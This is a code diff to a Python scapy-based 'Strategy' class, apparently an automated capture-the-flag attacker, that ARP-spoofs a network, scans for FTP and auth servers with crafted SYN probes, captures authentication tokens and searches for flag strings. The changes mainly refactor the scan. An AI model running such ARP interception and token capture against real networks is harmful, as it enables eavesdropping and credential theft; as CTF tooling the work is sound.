@@ -33,7 +33,7 @@ class Strategy(strategy.Strategy):
             super().__init__()
             self.port = port
             self.authed_token = None
-            
+
         def filter(self, pkt):
             if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
                 tcp, raw = pkt[scapy.TCP], pkt[scapy.Raw]
@@ -49,14 +49,18 @@ class Strategy(strategy.Strategy):
 
     def execute(self, iface, flagpattern="flag\{.*?\}", canceltoken=None):
         sniffer = capture.Sniffer(iface=iface)
-        mitm = capture.ArpMitmModule(filter=self.AuthenticationFilter())
+        mitm = capture.ArpMitmModule(filter=self.AuthenticationFilter(), iface=iface)
         sniffer.register(
             mitm
         )
 
         with sniffer:
+            # Give the sniffer a chace to get started
             ftpserver = None
             authserver = None
+
+            def tcpprobe(mac, ip, port):
+                return scapy.Ether(src=str(net.ifhwaddr(iface)), dst=mac)/scapy.IP(src=str(net.ifaddr(iface)), dst=ip)/scapy.TCP(sport=random.randint(32000, 50000), dport=port, flags="S")
 
             # Scan for the ftp server and the auth server until they are up
             logging.info("Scanning {:s} for an FTP server and an auth server at tcp port {:d}".format(net.ifcidr(iface), self.authport))
@@ -68,10 +72,9 @@ class Strategy(strategy.Strategy):
                     time.sleep(1)
                     continue
 
-                ans, unans = scapy.sr(
-                    scapy.IP(dst=list(mitm.cache.cache.keys()))/scapy.TCP(sport=random.randint(32000, 50000), dport=[21, self.authport], flags="S"),
-                    timeout=self.scantimeout
-                )
+                pkts = [tcpprobe(mac, ip, 21) for ip, mac in mitm.cache.cache.items()]
+                pkts.extend(tcpprobe(mac, ip, self.authport) for ip, mac in mitm.cache.cache.items())
+                ans, unans = scapy.srp(pkts, iface=iface, timeout=self.scantimeout)
 
                 for req, resp in ans:
                     if all(layer in resp for layer in (scapy.IP, scapy.TCP)):
